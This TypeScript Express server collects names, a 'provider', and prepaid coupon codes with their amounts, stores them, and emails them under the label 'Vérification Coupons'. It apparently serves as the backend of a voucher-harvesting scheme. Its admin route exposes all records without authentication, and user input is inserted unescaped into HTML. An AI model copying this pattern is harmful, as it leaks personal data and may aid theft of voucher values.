import 'dotenv/config';
import express, { Request, Response, Application } from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import { PrismaClient } from '@prisma/client';
import nodemailer from 'nodemailer';

const app: Application = express();
const prisma = new PrismaClient();
const PORT = Number(process.env.PORT) || 5000;

app.use(cors());
app.use(bodyParser.json());

// Fonction pour envoyer un email au moment d'un enregistrement
const sendNotificationEmail = async (
  nom: string,
  prenom: string,
  provider: string,
  coupons: { code: string, montant: string }[]
): Promise<void> => {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER!,
      pass: process.env.EMAIL_PASS!
    }
  });

  const content = `
    <h2>🧾 Nouvel enregistrement reçu !</h2>
    <p><strong>Nom :</strong> ${nom}</p>
    <p><strong>Prénom :</strong> ${prenom}</p>
    <p><strong>Provider :</strong> ${provider}</p>
    <h3>Coupons :</h3>
    <ul>
      ${coupons.map(c => `<li><strong>${c.code}</strong> - ${c.montant}€</li>`).join('')}
    </ul>
  `;

  await transporter.sendMail({
    from: `"Vérification Coupons" <${process.env.EMAIL_USER}>`,
    to: process.env.EMAIL_USER, // Tu peux mettre ici un autre email admin si besoin
    subject: `🧾 Nouveau coupon soumis par ${nom} ${prenom}`,
    html: content
  });
};

// ✅ Route POST pour enregistrer les données
app.post('/api/enregistrement', async (req: Request, res: Response): Promise<void> => {
  try {
    const { nom, prenom, provider, codes, montants } = req.body;

    if (!nom || !prenom || !provider || !codes || !montants) {
      res.status(400).json({ message: 'Champs manquants' });
      return;
    }

    const coupons = codes.map((code: string, index: number) => ({
      code,
      montant: montants[index] || null,
    }));

    const nouveau = await prisma.enregistrement.create({
      data: {
        nom,
        prenom,
        provider,
        coupons: JSON.stringify(coupons),
      },
    });

    // 🔔 Envoi de l'email après enregistrement
    await sendNotificationEmail(nom, prenom, provider, coupons);

    res.status(201).json({
      message: 'Enregistrement réussi',
      data: nouveau,
    });
  } catch (error) {
    console.error('Erreur lors de l’enregistrement :', error);
    res.status(500).json({ message: 'Erreur serveur' });
  }
});

// ✅ Route GET pour l’interface admin
app.get('/api/enregistrements', async (req: Request, res: Response) => {
  try {
    const data = await prisma.enregistrement.findMany();
    res.status(200).json(data);
  } catch (error) {
    console.error('Erreur récupération :', error);
    res.status(500).json({ message: 'Erreur serveur' });
  }
});

// ✅ Lancement du serveur
app.listen(PORT, '0.0.0.0',() => {
  console.log(`🚀 Serveur backend démarré sur http://localhost:${PORT}`);
});
